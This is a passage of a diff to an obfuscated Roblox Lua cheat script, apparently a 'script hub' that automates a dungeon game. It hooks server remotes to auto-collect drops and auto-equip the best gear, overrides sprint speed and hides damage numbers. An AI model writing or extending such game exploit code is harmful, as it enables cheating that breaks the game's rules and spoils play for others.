-                            libNoti('Timeout! Force restarting dungeon!')
+                        if tick() - a5 >= Options.timeoutTimer.Value then
+                            cq('Timeout! Force restarting dungeon!')
                             missionEndRestartOrNextEvent()
                             break
                         else
-                            Options.Offset:SetValue(gb)
+                            Options.Offset:SetValue(gH)
                         end
                     end
                 end
@@ -5684,112 +5929,104 @@ end)
 Toggles.CollectDrops:OnChanged(function()
     task.spawn(function()
         while Toggles.CollectDrops.Value do
-            for gc, gd in aS do
-                gd.model:Destroy()
-                gd.followPart:Destroy()
-                table.remove(aS, gc)
-                aT:FireServer(gd.id)
+            for gI, gJ in pairs(aM) do
+                gJ.model:Destroy()
+                gJ.followPart:Destroy()
+                table.remove(aM, gI)
+                aN:FireServer(gJ.id)
             end
             task.wait()
         end
     end)
 end)
-Toggles.autoEquipBestwWep:OnChanged(function(cM)
-    if not cM then
+Toggles.autoEquipBestwWep:OnChanged(function(cU)
+    if not cU then
         return
     end
     task.spawn(function()
         while Toggles.autoEquipBestwWep.Value do
-            local ge, gf = 0, 0;
-            local gg, gh;
-            local f_ = aZ:GetChildren()[1]
-            if f_ then
-                ge = bK:GetItemStats(f_)['Attack'] or 0
+            local gK, gL = 0, 0;
+            local gM, gN;
+            local gt = aT:GetChildren()[1]
+            if gt then
+                gK = bM:GetItemStats(gt)['Attack'] or 0
             end
-            local gi, gj = 0, 0;
-            local gk, gl;
-            local gm = b0:GetChildren()[1]
-            if gm then
-                gi = bK:GetItemStats(gm)['Defense'] or 0
+            local gO, gP = 0, 0;
+            local gQ, gR;
+            local gS = aV:GetChildren()[1]
+            if gS then
+                gO = bM:GetItemStats(gS)['Defense'] or 0
             end
-            for K, L in bE:GetChildren() do
-                if L:FindFirstChild('Level') and L.Level.Value <= aU.Level.Value then
-                    local gn = bJ[L.Name]
-                    local go, gp = gn.Type == 'Weapon', gn.Type == 'Armor'
-                    local gq, gr = go and bK:GetItemStats(L)['Attack'], gp and bK:GetItemStats(L)['Defense']
-                    if go and gq and gq > ge and gq > gf then
-                        gg = L;
-                        gf = gq;
-                        gh = gn.DisplayKey
+            for B, C in bF:GetChildren() do
+                if C:FindFirstChild('Level') and C.Level.Value <= aO.Level.Value then
+                    local gT = bL[C.Name]
+                    local gU, gV = gT.Type == 'Weapon', gT.Type == 'Armor'
+                    local gW, gX = gU and bM:GetItemStats(C)['Attack'], gV and bM:GetItemStats(C)['Defense']
+                    if gU and gW and gW > gK and gW > gL then
+                        gM = C;
+                        gL = gW;
+                        gN = gT.DisplayKey
                     end
-                    if gp and gr and gr > gi and gr > gj then
-                        gk = L;
-                        gj = gr;
-                        gl = gn.DisplayKey
+                    if gV and gX and gX > gO and gX > gP then
+                        gQ = C;
+                        gP = gX;
+                        gR = gT.DisplayKey
                     end
                 end
             end
-            if gg then
-                libNoti('Equipped a T' .. bT:GetItemTier(gg) .. ' ' .. gh .. ' - Power: ' .. gf)
-                bL:FireServer(gg, aZ)
+            if gM then
+                cq('Equipped a T' .. bZ:GetItemTier(gM) .. ' ' .. gN .. ' - Power: ' .. gL)
+                bN:FireServer(gM, aT)
             end
-            if gk then
-                libNoti('Equipped a T' .. bT:GetItemTier(gk) .. ' ' .. gl .. ' - Defense: ' .. gj)
-                bL:FireServer(gk, b0)
+            if gQ then
+                cq('Equipped a T' .. bZ:GetItemTier(gQ) .. ' ' .. gR .. ' - Defense: ' .. gP)
+                bN:FireServer(gQ, aV)
             end
             task.wait(2)
         end
     end)
 end)
-local cb = require(game.ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Effects"))
-local gs = cb.RenderDamageNumber;
+local fW = require(game.ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Effects"))
+local gY = fW.RenderDamageNumber;
 Toggles.NVD:OnChanged(function()
-    cb.RenderDamageNumber = function(...)
+    fW.RenderDamageNumber = function(...)
         if Toggles.NVD.Value then
             return
         end
-        return gs(...)
+        return gY(...)
     end
 end)
 Options.FastSprint:OnChanged(function()
-    bM.SPRINT_WALKSPEED = Options.FastSprint.Value
+    bQ.SPRINT_WALKSPEED = Options.FastSprint.Value
 end)
-ci:SetLibrary(ch)
-cj:SetLibrary(ch)
-cj:IgnoreThemeSettings()
-cj:SetIgnoreIndexes({'MenuKeybind'})
-ci:SetFolder('MyScriptHub')
-cj:SetFolder('MyScriptHub')
-cj:BuildConfigSection(cs['Settings'])
-ci:ApplyToTab(cs['Settings'])
-local gt = cs['Settings']:AddRightGroupbox('Menu')
-gt:AddButton('Unload', function()
-    ch:Unload()
+local gZ = cA['Settings']:AddLeftGroupbox('Menu')
+gZ:AddButton('Unload', function()
+    bk:Unload()
 end)
-gt:AddLabel('Menu bind'):AddKeyPicker('MenuKeybind', {
+gZ:AddLabel('Menu bind'):AddKeyPicker('MenuKeybind', {
     Default = 'LeftAlt',
     NoUI = false,
     Text = 'Menu keybind'
 })
-ch.ToggleKeybind = Options.MenuKeybind;
-local gu = tick()
-while tick() - gu < 60 do
-    if aw then
-        cj:LoadAutoloadConfig()
-        if as and ar:FindFirstChild(24) then
-            if Options.Offset.Value > 45 then
-                Options.Offset:SetValue(45)
-                libNoti('Set offset value to 45 to avoid death')
-            end
+bk.ToggleKeybind = Options.MenuKeybind;
+cf:SetLibrary(bk)
+cg:SetLibrary(bk)
+cg:IgnoreThemeSettings()
+cg:SetIgnoreIndexes({'MenuKeybind'})
+cf:SetFolder('MyScriptHub')
+cg:SetFolder('MyScriptHub')
+cg:BuildConfigSection(cA['Settings'])
+cf:ApplyToTab(cA['Settings'])
+if ao then
+    cg:LoadAutoloadConfig()
+    if ak and aj:FindFirstChild(24) then
+        if Options.Offset.Value > 45 then
+            Options.Offset:SetValue(45)
+            cq('Set offset value to 45 to avoid death')
         end
-        break
     end
-    task.wait()
 end
-if Toggles.autoHide.Value and aw then
+if Toggles.autoHide.Value then
     task.wait(0.25)
-    ch:Toggle()
+    bk:Toggle()
 end
-pcall(function()
-    a4 = game:GetService("MarketplaceService"):UserOwnsGamePassAsync(d, 8136250)
-end)
